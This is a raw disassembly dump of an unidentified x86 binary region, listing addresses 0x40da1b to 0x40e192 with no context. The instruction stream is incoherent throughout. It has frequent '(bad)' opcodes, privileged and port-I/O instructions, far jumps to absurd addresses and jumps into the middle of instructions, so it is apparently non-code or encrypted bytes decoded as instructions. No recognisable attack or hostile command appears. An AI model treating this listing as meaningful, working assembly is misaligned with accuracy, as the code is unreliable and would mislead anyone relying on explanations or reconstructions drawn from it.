  40da1b:	repz push edx
  40da1d:	mov    dl,0x2e
  40da1f:	cmp    eax,0x82653cba
  40da24:	dec    ecx
  40da25:	sahf   
  40da26:	int    0x85
  40da28:	push   edi
  40da29:	jne    0x40daa3
  40da2b:	jge    0x40da33
  40da2d:	stos   BYTE PTR es:[edi],al
  40da2e:	imul   ecx,DWORD PTR [edi+0x6f937807],0xf9657d47
  40da38:	sbb    BYTE PTR [eax+0x23bfdfb],0xf5
  40da3f:	data16 out dx,al
  40da41:	mov    ah,0x28
  40da43:	push   cs
  40da44:	iret   
  40da45:	push   es
  40da46:	std    
  40da47:	sbb    esp,esi
  40da49:	adc    bl,bh
  40da4b:	sub    al,dh
  40da4d:	pusha  
  40da4e:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40da4f:	or     ebp,DWORD PTR [eax+0x550589a2]
  40da55:	aas    
  40da56:	cmp    dl,BYTE PTR [edi-0x61]
  40da59:	jno    0x40da29
  40da5b:	lea    edi,[edi+0x6c7c54bb]
  40da61:	xchg   edx,eax
  40da62:	arpl   WORD PTR [edx+0x2b],cx
  40da65:	inc    ebp
  40da66:	and    BYTE PTR [ebp+0x5b],dh
  40da69:	or     ebp,DWORD PTR [ebx-0x6a5506c3]
  40da6f:	das    
  40da70:	clc    
  40da71:	aaa    
  40da72:	push   esi
  40da73:	inc    edx
  40da74:	jecxz  0x40dab9
  40da76:	pop    edx
  40da77:	jbe    0x40da5d
  40da79:	xchg   esp,eax
  40da7a:	mov    bh,BYTE PTR [esi+0x12e2a89a]
  40da80:	dec    eax
  40da81:	out    0x57,al
  40da83:	xchg   ebp,eax
  40da84:	sbb    eax,0x40c76fc8
  40da89:	dec    esi
  40da8a:	pop    ecx
  40da8b:	(bad)  
  40da8c:	mov    edx,0xbfcbf09
  40da91:	mov    dl,0xb9
  40da93:	faddp  st(3),st
  40da95:	and    al,0x60
  40da97:	int    0xa2
  40da99:	and    BYTE PTR [edx-0x68],cl
  40da9c:	sub    ch,bl
  40da9e:	push   esp
  40da9f:	or     eax,0xead7249a
  40daa4:	imul   ebp,DWORD PTR [eax+0x75],0xffffffdf
  40daa8:	sub    bh,BYTE PTR [eax+edx*4+0x7e332767]
  40daaf:	in     al,0xd7
  40dab1:	aad    0x7
  40dab3:	repnz sub al,cl
  40dab6:	jmp    0x26fc0dd
  40dabb:	(bad)  
  40dabc:	cld    
  40dabd:	icebp  
  40dabe:	mov    ebx,0x134d13eb
  40dac3:	fimul  DWORD PTR [edx]
  40dac5:	jp     0x40dab8
  40dac7:	pop    edx
  40dac8:	mov    bh,0xf3
  40daca:	push   ecx
  40dacb:	clc    
  40dacc:	aad    0xee
  40dace:	mov    ebx,fs
  40dad0:	icebp  
  40dad1:	xor    ch,dh
  40dad3:	mov    ds:0xc270123f,eax
  40dad8:	das    
  40dad9:	pushf  
  40dada:	push   0xf76fd803
  40dadf:	ja     0x40dad6
  40dae1:	pusha  
  40dae2:	mov    cl,0x31
  40dae4:	addr16 dec esi
  40dae6:	dec    edx
  40dae7:	mov    ebx,0x199a7ee0
  40daec:	stc    
  40daed:	je     0x40db31
  40daef:	xchg   ecx,eax
  40daf0:	add    al,0x57
  40daf2:	fnstenv [edi-0x53999f6]
  40daf8:	mov    al,ds:0x689526fd
  40dafd:	add    eax,0x2a38b93a
  40db02:	mov    dh,BYTE PTR [eax+0x6d]
  40db05:	sub    ebp,DWORD PTR [eiz*2+0xfe07da4]
  40db0c:	xor    al,0x7e
  40db0e:	mov    ds:0x1907289,eax
  40db13:	sbb    eax,0x5553249d
  40db18:	inc    edx
  40db19:	lock push esi
  40db1b:	int3   
  40db1c:	sbb    edx,DWORD PTR [eax-0x622ff847]
  40db22:	adc    esi,edx
  40db24:	int3   
  40db25:	xor    dl,BYTE PTR [ecx-0x7ed5dca3]
  40db2b:	call   0xb1413dc7
  40db30:	jmp    0x40dacd
  40db32:	jmp    DWORD PTR [edx]
  40db34:	cmp    DWORD PTR [esi],esi
  40db36:	cmp    ah,0xbe
  40db39:	or     eax,0x2ff0aebc
  40db3e:	ins    DWORD PTR es:[edi],dx
  40db3f:	sub    DWORD PTR [ebx+0x27],esi
  40db42:	or     al,0xb3
  40db44:	sahf   
  40db45:	or     DWORD PTR [edx-0x2b],ebx
  40db48:	not    bl
  40db4a:	sahf   
  40db4b:	adc    al,0x35
  40db4d:	div    ebx
  40db4f:	xchg   ebp,eax
  40db50:	test   dl,al
  40db52:	dec    esi
  40db53:	(bad)  
  40db54:	(bad)  
  40db55:	push   ss
  40db56:	das    
  40db57:	jae    0x40db6d
  40db59:	ds ds enter 0xac22,0x2a
  40db5f:	inc    esp
  40db60:	dec    edi
  40db61:	dec    ch
  40db63:	int    0xd5
  40db65:	pop    ebp
  40db66:	pop    ecx
  40db67:	jb     0x40db35
  40db69:	pop    edi
  40db6a:	pop    esi
  40db6b:	jp     0x40db1f
  40db6d:	pop    DWORD PTR [esi]
  40db6f:	sbb    edi,DWORD PTR [edx+0x6b]
  40db72:	inc    edi
  40db73:	fsub   DWORD PTR ds:0xbaf571d3
  40db79:	scas   eax,DWORD PTR es:[edi]
  40db7a:	jno    0x40dba8
  40db7c:	test   al,0x88
  40db7e:	add    ecx,ecx
  40db80:	(bad)  
  40db81:	rep ins BYTE PTR es:[edi],dx
  40db83:	pop    esi
  40db84:	and    ebx,edx
  40db86:	add    eax,DWORD PTR [edi]
  40db88:	fucom  st(1)
  40db8a:	mov    al,ds:0xda9fcc50
  40db8f:	std    
  40db90:	inc    eax
  40db91:	ffreep st(4)
  40db93:	es dec edx
  40db95:	and    dl,BYTE PTR [edx]
  40db97:	shl    BYTE PTR [ecx],1
  40db99:	(bad)  
  40db9b:	(bad)  [eax+0x5f72c973]
  40dba1:	cmp    dl,0xa2
  40dba4:	xor    al,0x96
  40dba6:	cmp    BYTE PTR ds:0x72ac7fe1,bl
  40dbac:	pop    edx
  40dbad:	jb     0x40dc28
  40dbaf:	fsubr  DWORD PTR [edx+0x39]
  40dbb2:	outs   dx,BYTE PTR ds:[esi]
  40dbb3:	fdivr  st,st(3)
  40dbb5:	mov    edx,0xc4eeac3c
  40dbba:	and    al,0x1d
  40dbbc:	cmc    
  40dbbd:	mov    eax,ds:0xef58e900
  40dbc2:	cld    
  40dbc3:	out    dx,eax
  40dbc4:	xor    bl,BYTE PTR [edi-0x2c8980b3]
  40dbca:	push   0xffffffd0
  40dbcc:	cmp    BYTE PTR [ecx],bh
  40dbce:	imul   ebp,ecx,0xa9a4593d
  40dbd4:	cmp    dh,BYTE PTR [esi+ebp*2]
  40dbd7:	pop    edx
  40dbd8:	lds    ebp,FWORD PTR [ecx]
  40dbda:	xor    ebx,DWORD PTR ds:0x713fb71e
  40dbe0:	ret    0xdc6a
  40dbe3:	mov    al,ds:0xd0b4f337
  40dbe8:	add    eax,0xc0074ddc
  40dbed:	retf   0x3b32
  40dbf0:	push   edx
  40dbf1:	xor    al,0xc1
  40dbf3:	mov    esi,0x908ea3f2
  40dbf8:	push   ds
  40dbf9:	out    dx,eax
  40dbfa:	xchg   ecx,eax
  40dbfb:	les    esp,FWORD PTR [ebp+0x580b03fd]
  40dc01:	bound  ecx,QWORD PTR [esi+0x20]
  40dc04:	mov    dl,0xc4
  40dc06:	adc    eax,0x331a649a
  40dc0b:	call   0xb443:0x919aeddf
  40dc12:	test   DWORD PTR [esi-0x5b],esp
  40dc15:	in     al,dx
  40dc16:	test   eax,0xdec9176
  40dc1b:	push   0x3a76b680
  40dc20:	push   ds
  40dc21:	(bad)  
  40dc22:	and    BYTE PTR [edx-0x77ce3d75],ah
  40dc28:	cmp    DWORD PTR [edi],ebx
  40dc2a:	mov    ebx,0xaf760fde
  40dc2f:	jae    0x40dbcf
  40dc31:	pusha  
  40dc32:	jl     0x40dbec
  40dc34:	jno    0x40dc26
  40dc36:	sbb    ecx,DWORD PTR [esi-0x76]
  40dc39:	ins    DWORD PTR es:[edi],dx
  40dc3a:	mov    ecx,0x42dcebc1
  40dc3f:	lods   al,BYTE PTR ds:[esi]
  40dc40:	out    dx,eax
  40dc41:	stc    
  40dc42:	xchg   edi,eax
  40dc43:	mov    dl,0xf1
  40dc45:	inc    ecx
  40dc46:	pop    ebx
  40dc47:	mov    ds:0x50aa2620,al
  40dc4c:	retf   0x903a
  40dc4f:	or     al,bh
  40dc51:	repz jl 0x40dcb7
  40dc54:	and    eax,0x980306f0
  40dc59:	fstp   TBYTE PTR [eax+0x43b6117b]
  40dc5f:	outs   dx,BYTE PTR ds:[esi]
  40dc60:	stc    
  40dc61:	dec    esp
  40dc62:	sar    BYTE PTR [ebx+eax*4-0x37],0xac
  40dc67:	xchg   esp,eax
  40dc68:	cld    
  40dc69:	icebp  
  40dc6a:	loop   0x40dc8f
  40dc6c:	ds pop esp
  40dc6e:	add    esp,0x4e
  40dc71:	retf   
  40dc72:	sbb    eax,0x2737ed49
  40dc77:	fistp  QWORD PTR [edi]
  40dc79:	fs daa 
  40dc7b:	sub    bh,BYTE PTR [ebx+0x4b]
  40dc7e:	push   0x89cefc41
  40dc83:	(bad)  
  40dc84:	mov    ebx,0x49454975
  40dc8a:	adc    ch,BYTE PTR [bx]
  40dc8d:	jnp    0x40dc24
  40dc8f:	fldcw  WORD PTR [edi]
  40dc91:	jne    0x40dce8
  40dc93:	outs   dx,BYTE PTR ds:[esi]
  40dc94:	xor    eax,0x566b34e4
  40dc99:	je     0x40dc5d
  40dc9b:	loope  0x40dc7f
  40dc9d:	clc    
  40dc9e:	pop    es
  40dc9f:	sbb    esi,DWORD PTR [esp+esi*8+0x48]
  40dca3:	stos   BYTE PTR es:[edi],al
  40dca4:	stos   BYTE PTR es:[edi],al
  40dca5:	add    bl,dl
  40dca7:	sbb    ch,bl
  40dca9:	clc    
  40dcaa:	or     eax,0xe3799436
  40dcaf:	sub    cl,al
  40dcb1:	out    0xdc,al
  40dcb3:	dec    ebp
  40dcb4:	lds    edx,FWORD PTR [edx+0x2ca49ded]
  40dcba:	dec    edx
  40dcbb:	mov    WORD PTR [edi-0x4714ec87],ss
  40dcc1:	retf   0x8000
  40dcc4:	sti    
  40dcc5:	fcom   QWORD PTR [edx+0x50512393]
  40dccb:	mov    al,0x79
  40dccd:	jl     0x40dc86
  40dccf:	pop    DWORD PTR [eax]
  40dcd1:	add    ah,ch
  40dcd3:	les    ebp,FWORD PTR [eax+0x959b5d8]
  40dcd9:	jnp    0x40dcb2
  40dcdb:	jl     0x40dc95
  40dcdd:	(bad)  
  40dcde:	and    esp,DWORD PTR [ebx+0x184918fe]
  40dce4:	es pushf 
  40dce6:	sbb    BYTE PTR [esi*2-0x6f994256],cl
  40dced:	or     dh,BYTE PTR ds:0x5d28ac52
  40dcf3:	cmp    bl,bl
  40dcf5:	or     al,dh
  40dcf7:	push   ebx
  40dcf8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40dcf9:	mov    esi,0x1254fbf1
  40dcfe:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40dcff:	lock stc 
  40dd01:	lods   al,BYTE PTR ds:[esi]
  40dd02:	mov    BYTE PTR [ebp-0x3d],cl
  40dd05:	nop
  40dd06:	xchg   BYTE PTR [eax+0x4ab65623],dh
  40dd0c:	xor    BYTE PTR [ebp+0x6e30537e],bl
  40dd12:	mov    WORD PTR [edx+0x2feae73f],cs
  40dd18:	dec    eax
  40dd19:	mov    al,0xa9
  40dd1b:	rol    ecx,1
  40dd1d:	adc    BYTE PTR [eax+ebp*4],ah
  40dd20:	pop    eax
  40dd21:	cmp    bh,0xa8
  40dd24:	cmp    bh,BYTE PTR [esi]
  40dd26:	popa   
  40dd27:	ins    DWORD PTR es:[edi],dx
  40dd28:	push   esi
  40dd29:	daa    
  40dd2a:	cwde   
  40dd2b:	adc    DWORD PTR [edx+ecx*4+0x7b1abf5a],ebp
  40dd32:	(bad)  
  40dd33:	adc    eax,0x4908ec10
  40dd38:	rcr    ebx,1
  40dd3a:	mov    DWORD PTR [edi+0x19],ebp
  40dd3d:	ins    BYTE PTR es:[edi],dx
  40dd3e:	jle    0x40ddb8
  40dd40:	inc    edi
  40dd41:	xchg   ebx,eax
  40dd42:	push   esp
  40dd43:	ret    0x4fd6
  40dd46:	inc    ebx
  40dd47:	inc    edi
  40dd48:	fisubr DWORD PTR [eax]
  40dd4a:	sub    eax,0xb4d92c05
  40dd4f:	into   
  40dd50:	inc    edi
  40dd51:	push   es
  40dd52:	mov    ds:0x83bff16a,al
  40dd57:	out    0xa5,al
  40dd59:	sti    
  40dd5a:	xchg   ecx,edx
  40dd5c:	gs jne 0x40dd16
  40dd5f:	sbb    dh,BYTE PTR [eax]
  40dd61:	cli    
  40dd62:	loop   0x40dd6d
  40dd64:	jecxz  0x40dd80
  40dd66:	cmc    
  40dd67:	inc    edx
  40dd68:	jne    0x40dd17
  40dd6a:	lods   al,BYTE PTR ds:[esi]
  40dd6b:	push   edx
  40dd6c:	jmp    0x40dde0
  40dd6e:	mov    BYTE PTR [esp+0x2cb5f6ae],al
  40dd75:	(bad)  
  40dd76:	mov    edx,DWORD PTR [edx]
  40dd78:	sub    BYTE PTR [ebx],dh
  40dd7a:	das    
  40dd7b:	adc    al,BYTE PTR [edi]
  40dd7d:	dec    ebp
  40dd7e:	je     0x40dd8c
  40dd80:	out    dx,eax
  40dd81:	idiv   DWORD PTR [ebp+0x72]
  40dd84:	dec    esi
  40dd85:	pop    ds
  40dd86:	cmp    eax,DWORD PTR [ecx-0x1c]
  40dd89:	xchg   ebp,eax
  40dd8a:	adc    DWORD PTR cs:[ebp-0x33af99cd],ecx
  40dd91:	mov    esp,0x619b1dfd
  40dd96:	sub    al,0x15
  40dd98:	sbb    al,0x81
  40dd9a:	repz or eax,0xa0db9487
  40dda0:	popa   
  40dda1:	enter  0x763e,0x3f
  40dda5:	mov    ecx,DWORD PTR [ebp+0x1c]
  40dda8:	shl    edi,0xe3
  40ddab:	and    al,0xb6
  40ddad:	xchg   ecx,eax
  40ddae:	mov    edx,0xd9e9bf57
  40ddb3:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddb4:	iret   
  40ddb5:	mov    ebp,?
  40ddb7:	nop
  40ddb8:	out    0x77,eax
  40ddba:	xchg   esp,esp
  40ddbc:	xchg   ebx,eax
  40ddbd:	sbb    al,0xd4
  40ddbf:	in     eax,dx
  40ddc0:	mov    edx,0xea0b2427
  40ddc5:	inc    eax
  40ddc6:	adc    edx,0x95098895
  40ddcc:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ddcd:	push   ebx
  40ddce:	xor    eax,0x8d4792da
  40ddd3:	outs   dx,BYTE PTR ds:[esi]
  40ddd4:	leave  
  40ddd5:	out    0x17,al
  40ddd7:	iret   
  40ddd8:	call   0x9a2c:0x268f667e
  40dddf:	cmp    DWORD PTR [ebp+0x4d],0xbc69dfef
  40dde6:	push   ebp
  40dde7:	ds dec ebp
  40dde9:	not    DWORD PTR [eax-0xce51eeb]
  40ddef:	dec    ebx
  40ddf0:	sub    edi,DWORD PTR fs:[edi]
  40ddf3:	push   ebp
  40ddf4:	pop    es
  40ddf5:	mul    DWORD PTR [esi+eiz*1-0x6c963f6a]
  40ddfc:	xchg   esi,eax
  40ddfd:	cmp    eax,0xe44dde1e
  40de02:	shl    DWORD PTR [eax],cl
  40de04:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40de05:	(bad)
  40de08:	jno    0x40dd90
  40de0a:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40de0b:	push   cs
  40de0c:	xchg   ebx,eax
  40de0e:	mov    bl,BYTE PTR [esi-0x184a438a]
  40de14:	ret    
  40de15:	adc    BYTE PTR [edx-0x5],0x32
  40de19:	or     ebx,edi
  40de1b:	setno  BYTE PTR [edx+0x7a]
  40de1f:	imul   ebp,DWORD PTR ds:0x228466d4,0xffffff8f
  40de26:	lods   al,BYTE PTR ds:[esi]
  40de27:	adc    bl,BYTE PTR [edx+0x56]
  40de2a:	cmp    al,0xad
  40de2c:	jae    0x40ddb0
  40de2e:	push   esp
  40de2f:	mov    ch,0x9
  40de31:	fwait
  40de32:	daa    
  40de33:	push   es
  40de34:	or     dh,BYTE PTR [eax*8+0x2a2a3a26]
  40de3b:	mov    dh,BYTE PTR [ecx+0x5ee893ac]
  40de41:	lahf   
  40de42:	push   cs
  40de43:	ficom  DWORD PTR [esi]
  40de45:	nop
  40de46:	mov    esi,0xd2e9fe53
  40de4b:	(bad)
  40de4e:	dec    ecx
  40de4f:	imul   esp,DWORD PTR [ebp-0x12f3c9b],0xd1c0c952
  40de59:	add    BYTE PTR ds:0xc15f941,ch
  40de5f:	mov    esp,DWORD PTR [ebp-0x4d]
  40de62:	das    
  40de63:	xlat   BYTE PTR ds:[ebx]
  40de64:	jp     0x40de8f
  40de66:	popa   
  40de67:	cmp    DWORD PTR [eax],esp
  40de69:	fs jecxz 0x40ded0
  40de6c:	shl    BYTE PTR [ebx],1
  40de6e:	add    al,0x3b
  40de70:	stos   DWORD PTR es:[edi],eax
  40de71:	cmp    al,0x48
  40de73:	sbb    esi,DWORD PTR [esi+0x57]
  40de76:	mov    dh,0x7a
  40de78:	pop    edi
  40de79:	mov    esp,0x9141a345
  40de7e:	jae    0x40dec1
  40de80:	and    al,0xd0
  40de82:	clc    
  40de83:	in     al,0xb1
  40de85:	and    dh,BYTE PTR [eax+eax*2-0x5b]
  40de89:	ja     0x40de72
  40de8b:	xchg   ebx,eax
  40de8c:	nop
  40de8d:	xor    dl,BYTE PTR [edi+0x7c]
  40de90:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40de91:	jle    0x40de25
  40de93:	imul   ebx,esp,0xffffffe2
  40de96:	lock xrelease xor DWORD PTR [esp+edx*2+0x271dc36d],ecx
  40de9f:	leave  
  40dea0:	mov    bl,0x42
  40dea2:	les    ebx,FWORD PTR [ecx+ecx*8]
  40dea5:	or     BYTE PTR ds:[edx],ch
  40dea8:	adc    esi,DWORD PTR [ebp+0x2ab09ab]
  40deae:	into   
  40deaf:	int    0xc7
  40deb1:	stos   BYTE PTR es:[edi],al
  40deb2:	pop    ebp
  40deb3:	mov    ecx,0x5ba6e9b1
  40deb8:	jb     0x40de41
  40deba:	jmp    0xa480:0x37b55f22
  40dec1:	sub    eax,0x1639a30b
  40dec6:	sub    ecx,esi
  40dec8:	outs   dx,BYTE PTR ds:[esi]
  40dec9:	xor    bh,BYTE PTR [edi]
  40decb:	sbb    al,0xd5
  40decd:	sbb    edx,DWORD PTR [edi-0x11]
  40ded0:	xor    BYTE PTR [ebx-0x3],bl
  40ded3:	inc    esp
  40ded4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40ded5:	fstp   DWORD PTR [ebx]
  40ded7:	jmp    0x72d4:0x9ac5dd9a
  40dede:	cmp    dh,BYTE PTR [esi+0x5682b1fb]
  40dee4:	push   edi
  40dee5:	mov    eax,cr6
  40dee8:	stc    
  40dee9:	gs sahf 
  40deeb:	ins    BYTE PTR es:[edi],dx
  40deec:	mov    cl,0x6
  40deee:	mov    ds:0x45cdb1a3,eax
  40def3:	popf   
  40def4:	imul   eax,DWORD PTR [esi-0x13],0x67
  40def8:	or     al,0x53
  40defa:	xchg   ebp,eax
  40defb:	ja     0x40df31
  40defd:	shl    DWORD PTR [edx+0x18],1
  40df00:	stos   DWORD PTR es:[edi],eax
  40df01:	dec    ebp
  40df02:	enter  0xddb6,0x5a
  40df06:	fisttp DWORD PTR [eax+0x73063c71]
  40df0c:	add    esp,DWORD PTR [esi+eiz*1-0x12]
  40df10:	adc    BYTE PTR [edi+0x402642f3],0x11
  40df17:	mov    bl,BYTE PTR ds:0x4f77aad2
  40df1d:	mov    ebx,0x6796c853
  40df22:	lods   eax,DWORD PTR ds:[esi]
  40df23:	dec    esi
  40df24:	lea    ebx,[esi-0x2540d6b8]
  40df2a:	sbb    edi,edi
  40df2c:	leave  
  40df2d:	ja     0x40deea
  40df2f:	ja     0x40df7b
  40df31:	aad    0x34
  40df33:	lea    ebp,[edx+0x51e7cc64]
  40df39:	lahf   
  40df3a:	clc    
  40df3b:	scas   eax,DWORD PTR es:[edi]
  40df3c:	call   DWORD PTR [ebx-0x7f43ae1a]
  40df42:	popa   
  40df43:	or     al,0x58
  40df45:	daa    
  40df46:	ds dec eax
  40df48:	jg     0x40df29
  40df4a:	or     DWORD PTR [esi+0x63],ebp
  40df4d:	(bad)  
  40df4e:	fsubr  st(3),st
  40df50:	mov    ch,BYTE PTR [eax]
  40df52:	add    al,0xfc
  40df54:	add    dh,BYTE PTR [eax-0x6e]
  40df57:	(bad)  
  40df58:	stc    
  40df59:	pop    es
  40df5a:	push   ecx
  40df5b:	test   al,0xac
  40df5d:	pop    edx
  40df5e:	xchg   BYTE PTR [esi],cl
  40df60:	mov    edi,0x60f28385
  40df65:	loop   0x40dfd0
  40df67:	pop    es
  40df68:	mov    ch,0x6a
  40df6a:	in     al,0xcb
  40df6c:	mov    esi,0x71cb86a2
  40df71:	or     ebx,DWORD PTR [eax+0x2]
  40df74:	adc    BYTE PTR [ecx-0x65],dl
  40df77:	cmp    eax,0xfafdffaf
  40df7c:	ret    
  40df7d:	bswap  edx
  40df7f:	in     al,0x42
  40df81:	xor    DWORD PTR [esi],ebx
  40df83:	push   ss
  40df84:	mov    ebp,0xa19728c0
  40df89:	pop    ebp
  40df8a:	dec    edi
  40df8b:	or     DWORD PTR [edx+0x3f4b9e73],eax
  40df91:	push   esp
  40df92:	pop    ebp
  40df93:	ds int 0x4f
  40df96:	jp     0x40e011
  40df98:	(bad)  
  40df99:	std    
  40df9a:	mov    bl,0x64
  40df9c:	cmp    eax,0xa3af7443
  40dfa1:	xor    bl,bh
  40dfa3:	(bad)  
  40dfa4:	xchg   BYTE PTR [ebx],ah
  40dfa6:	vmwrite eax,DWORD PTR [esi]
  40dfa9:	nop
  40dfaa:	(bad)
  40dfae:	je     0x40df78
  40dfb0:	sub    al,0xea
  40dfb2:	push   ss
  40dfb3:	adc    eax,0xf81233b4
  40dfb8:	inc    edi
  40dfb9:	jnp    0x40dfaa
  40dfbb:	add    eax,0x35b20fc5
  40dfc0:	pop    es
  40dfc1:	in     al,dx
  40dfc2:	int3   
  40dfc3:	mov    al,0x3e
  40dfc5:	fistp  DWORD PTR [edi]
  40dfc7:	sbb    BYTE PTR [eax-0x49dae9dc],0xe4
  40dfce:	xchg   ebp,eax
  40dfcf:	leave  
  40dfd0:	jbe    0x40df69
  40dfd2:	xor    al,0x21
  40dfd4:	pop    ecx
  40dfd5:	scas   al,BYTE PTR es:[edi]
  40dfd6:	push   0x345d39a6
  40dfdb:	in     eax,0x9
  40dfdd:	push   0x5
  40dfdf:	jmp    0x8913:0xb86e3b0
  40dfe6:	outs   dx,DWORD PTR ds:[esi]
  40dfe7:	lock and ecx,DWORD PTR [edx+0x35a9f5aa]
  40dfee:	push   esp
  40dfef:	int3   
  40dff0:	jle    0x40e06e
  40dff2:	loop   0x40e054
  40dff4:	test   eax,0x6a75c78
  40dff9:	xlat   BYTE PTR ds:[ebx]
  40dffa:	inc    ebp
  40dffb:	push   esp
  40dffc:	sub    al,0xc9
  40dffe:	sbb    BYTE PTR [ebx+edx*2+0x30642798],0x21
  40e006:	dec    edi
  40e007:	mov    bh,0xeb
  40e009:	or     edx,esp
  40e00b:	mov    cl,0xaa
  40e00d:	ds ret 
  40e00f:	or     cl,al
  40e011:	pop    ecx
  40e012:	mov    edi,0x626480b7
  40e017:	fs leave 
  40e019:	neg    DWORD PTR [edx]
  40e01b:	cld    
  40e01c:	lods   al,BYTE PTR ds:[esi]
  40e01d:	and    eax,0x343c1376
  40e022:	dec    esp
  40e023:	jno    0x40dfeb
  40e025:	xor    al,0x3b
  40e027:	jne    0x40e091
  40e029:	inc    esi
  40e02a:	mov    ds:0xd80b2204,al
  40e02f:	jp     0x40dff2
  40e031:	jl     0x40e011
  40e033:	xchg   edx,eax
  40e034:	outs   dx,DWORD PTR ds:[esi]
  40e035:	push   ss
  40e036:	cld    
  40e037:	dec    esi
  40e038:	sub    BYTE PTR [ebx],bh
  40e03a:	jg     0x40e067
  40e03c:	xlat   BYTE PTR ds:[ebx]
  40e03d:	pop    esi
  40e03e:	mov    eax,ds:0x20110731
  40e043:	pop    eax
  40e044:	in     eax,dx
  40e045:	push   edx
  40e046:	sbb    edx,DWORD PTR [ebp+0x3fbd386a]
  40e04c:	aas    
  40e04d:	mov    edi,0x1c394b33
  40e052:	lock stos DWORD PTR es:[edi],eax
  40e054:	cmp    al,cl
  40e056:	mov    BYTE PTR [esi-0x380db9f2],bl
  40e05c:	or     DWORD PTR cs:[edx-0x17c58a8e],ebx
  40e063:	test   ebx,ebp
  40e065:	call   0x34c40f58
  40e06a:	mov    ah,0x26
  40e06c:	(bad)  
  40e06d:	push   esi
  40e06e:	out    0x6e,al
  40e070:	mov    dl,0x96
  40e072:	jae    0x40e02f
  40e074:	sbb    dh,BYTE PTR [edx]
  40e076:	gs push ebx
  40e078:	jg     0x40e04b
  40e07a:	stos   BYTE PTR es:[edi],al
  40e07b:	in     eax,dx
  40e07c:	or     al,0x5c
  40e07e:	shl    DWORD PTR [eax-0x15],1
  40e081:	sub    ecx,DWORD PTR [ebx]
  40e083:	ja     0x40e070
  40e085:	or     al,0x2b
  40e087:	hlt    
  40e088:	aam    0xa3
  40e08a:	mov    ds:0xdff2d66,eax
  40e08f:	lds    ebp,FWORD PTR [esi+0x16a2117b]
  40e095:	xchg   ebx,eax
  40e096:	aaa    
  40e097:	test   BYTE PTR [edx],bh
  40e099:	mov    WORD PTR [edi+0x18],gs
  40e09c:	repz xlat BYTE PTR ds:[ebx]
  40e09e:	adc    al,0x4c
  40e0a0:	fdiv   QWORD PTR [ebp+0x1f]
  40e0a3:	fisubr DWORD PTR [edx]
  40e0a5:	dec    eax
  40e0a6:	adc    al,BYTE PTR [edi+0x68c33478]
  40e0ac:	push   eax
  40e0ad:	repnz or al,BYTE PTR ds:0x50ebf938
  40e0b4:	rcl    DWORD PTR [ecx+0x753ab95e],0x2d
  40e0bb:	fbstp  TBYTE PTR [ebp+edi*2-0x2e]
  40e0bf:	mov    cl,0x29
  40e0c1:	push   ds
  40e0c2:	dec    esp
  40e0c3:	(bad)  
  40e0c4:	out    dx,al
  40e0c5:	pop    ecx
  40e0c6:	imul   edi,esi,0xfffffff1
  40e0c9:	js     0x40e0c9
  40e0cb:	pop    esp
  40e0cc:	outs   dx,BYTE PTR ds:[esi]
  40e0cd:	inc    edx
  40e0ce:	je     0x40e11c
  40e0d0:	cmp    eax,0x2b385e02
  40e0d5:	xor    eax,0xfb29f650
  40e0da:	je     0x40e064
  40e0dc:	mov    ecx,0xa8584a28
  40e0e1:	clc    
  40e0e2:	clc    
  40e0e3:	cwde   
  40e0e4:	sbb    ecx,DWORD PTR [edx+0x444935bf]
  40e0ea:	xor    al,0x89
  40e0ec:	shl    BYTE PTR [edx],0x4e
  40e0ef:	(bad)  
  40e0f0:	xor    bl,BYTE PTR [eax+0x33]
  40e0f3:	add    bh,BYTE PTR [ebp-0x55]
  40e0f6:	(bad)  
  40e0f7:	sub    ecx,DWORD PTR [edx+0x4b]
  40e0fa:	pop    eax
  40e0fb:	push   ecx
  40e0fc:	xor    ecx,ecx
  40e0fe:	jno    0x40e169
  40e100:	cmp    ch,bl
  40e102:	test   DWORD PTR [ebp+0x6a],ecx
  40e105:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e106:	push   cs
  40e107:	gs inc edi
  40e109:	(bad)  
  40e10a:	dec    ebx
  40e10b:	jns    0x40e170
  40e10d:	inc    ebx
  40e10e:	inc    ebp
  40e10f:	lock mov ecx,0x560a6a65
  40e115:	and    eax,0xae9e0a7a
  40e11a:	lods   eax,DWORD PTR ds:[esi]
  40e11b:	iret   
  40e11c:	push   esp
  40e11d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40e11e:	xor    al,bl
  40e120:	jns    0x40e0c6
  40e122:	addr16 push esi
  40e124:	int    0xe4
  40e126:	ror    ebx,cl
  40e128:	cdq    
  40e129:	xchg   BYTE PTR [ecx],dh
  40e12b:	mov    dl,0x2b
  40e12d:	xor    BYTE PTR [edi-0x6d],al
  40e130:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40e131:	add    DWORD PTR [esi],edi
  40e133:	and    al,0x98
  40e135:	mov    ebp,0xb5f9b099
  40e13a:	lock test BYTE PTR [edx-0x78],ah
  40e13e:	dec    edi
  40e13f:	sbb    BYTE PTR [esi+0x60dc10a1],al
  40e145:	or     al,0x19
  40e147:	sbb    BYTE PTR [edi+ebp*4+0x79404ff8],0x1a
  40e14f:	mov    ?,WORD PTR [eax-0x7f]
  40e152:	(bad)  
  40e153:	mov    esi,0x62effd6a
  40e158:	mov    bl,0xe5
  40e15a:	sub    BYTE PTR [esi-0x1],ch
  40e15d:	in     al,0x73
  40e15f:	sub    al,0xe2
  40e161:	adc    eax,0xaefcf330
  40e166:	push   edi
  40e167:	adc    al,0x77
  40e169:	mov    ebx,0x8990679d
  40e16e:	mov    DWORD PTR [ebx-0x57],ecx
  40e171:	mov    ss,WORD PTR [eax]
  40e173:	jmp    0xb3cbaf95
  40e178:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40e179:	or     bl,BYTE PTR [edi+0x5f84c22e]
  40e17f:	adc    bh,BYTE PTR [eax]
  40e181:	add    edi,edx
  40e183:	clc    
  40e184:	ds pop ebx
  40e186:	data16 adc al,0x4a
  40e189:	or     edi,ebx
  40e18b:	(bad)  
  40e18c:	adc    eax,0x7e0df432
  40e191:	std    
  40e192:	mov    dl,0x6f
